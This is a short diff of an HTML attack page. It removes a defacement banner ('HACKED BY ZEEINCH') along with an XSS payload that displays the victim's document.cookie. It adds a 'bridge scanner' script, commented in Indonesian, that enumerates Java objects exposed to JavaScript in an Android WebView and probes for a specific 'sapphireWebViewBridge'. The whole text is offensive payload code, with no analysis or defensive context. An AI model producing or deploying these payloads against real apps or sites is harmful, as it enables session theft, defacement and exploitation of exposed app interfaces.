@@ -1,8 +1,21 @@
+<!DOCTYPE html>
 <html>
-<body style="background-color:red;">
-    <h1 style="color:white; font-size:100px;">HACKED BY ZEEINCH</h1>
+<body>
+    <h2>Shuvy Bridge Scanner</h2>
     <script>
-        alert("XSS SUCCESS! Cookies: " + document.cookie);
+        // Mencari tahu objek Java apa saja yang terekspos ke JS
+        var exposed = "";
+        for (var obj in window) {
+            if (typeof window[obj] === 'object' && window[obj].getClass) {
+                exposed += obj + "\\n";
+            }
+        }
+        alert("Exposed Interfaces: \\n" + exposed);
+        
+        // Atau tes panggilan langsung ke bridge yang kita ketahui
+        if(typeof sapphireWebViewBridge !== 'undefined') {
+            alert("sapphireWebViewBridge is active!");
+        }
     </script>
 </body>
 </html>
